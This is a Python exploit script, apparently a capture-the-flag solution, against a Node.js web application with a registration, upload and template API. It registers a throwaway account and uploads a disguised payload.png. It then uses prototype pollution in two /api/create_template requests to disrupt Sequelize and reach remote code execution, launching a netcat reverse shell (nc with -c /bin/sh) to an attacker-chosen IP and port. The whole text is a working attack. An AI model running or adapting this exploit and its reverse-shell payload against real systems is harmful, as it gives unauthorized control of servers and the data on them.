import requests
import sys
import os
import binascii

def get_rand():
    return binascii.hexlify(os.urandom(20)).decode()

# Required params
S = requests.Session()
url = sys.argv[1]
ip = sys.argv[2]
port = sys.argv[3]
token = None
user_id = None
uuid_pp = None
headers = None

final_payload = f"__proto__;x=Object;w=a=x.constructor.call``;w.type='pipe';w.readable=1;w.writable=1;a.file='/bin/sh';a.args=['/bin/sh','-c','nc {ip} {port} -c /bin/sh'];a.stdio=[w,w];ff=Function`process.binding\\x28\\x22spawn_sync\\x22\\x29.spawn\\x28a\\x29.output`;ff.call``//"

# Register
password = get_rand()
username = get_rand()
register_json={"firstname": get_rand(), "lastname": get_rand(), "password": password, "username": username}
S.post(f"{url}/api/register", json=register_json)

# Login
login_json={"password": password, "username": username}
try:
    res = S.post(f"{url}/api/login", json=register_json).json()
    if res.get("token"):
        token = res.get("token")
        S.headers.update({"Authorization":f"Bearer {token}"})
    else:
        print("[-] Login failed")
        sys.exit(-1)
except Exception as e:
    print("[-] Something bad happened...")
    print(e)
    sys.exit(-1)

# Create and upload the payload
with open("payload.png","w") as fd_payload:
    fd_payload.write("{d:"+final_payload+"()}")
res = S.post(f"{url}/api/upload", files={"picture":open("payload.png","r")}, data={"token":token}, proxies={"http":"http://localhost:8080"})

# Recover id of user and uuid of profile
try:
    res = S.get(f"{url}/api/me").json()
    if res.get("id") and res.get("pp"):
        user_id = res.get("id")
        uuid_pp = res.get("pp")
    else:
        print("[-] Fail to recover all information from profile")
        sys.exit(-1)
except Exception as e:
    print("[-] Something bad happened...")
    print(e)
    sys.exit(-1)

# Trigger the prototype pollution to f***** up sequelize and don't crash

f_up_sequelize_json={"__proto__": {"connection": {"uuid": "uuid"}, "fields": [], "raw": 1}, "firstname": get_rand(), "id": user_id, "lastname": get_rand(), "uuid": uuid_pp}
S.post(f"{url}/api/create_template", json=f_up_sequelize_json)

# Trigger again the prototype pollution to gain RCE
rce_json={"__proto__": {final_payload: 1, "xmlParts": []}, "firstname": get_rand(), "id": user_id, "lastname": get_rand(), "uuid": uuid_pp}
S.post(f"{url}/api/create_template", json=rce_json, proxies={"http":"http://localhost:8080"})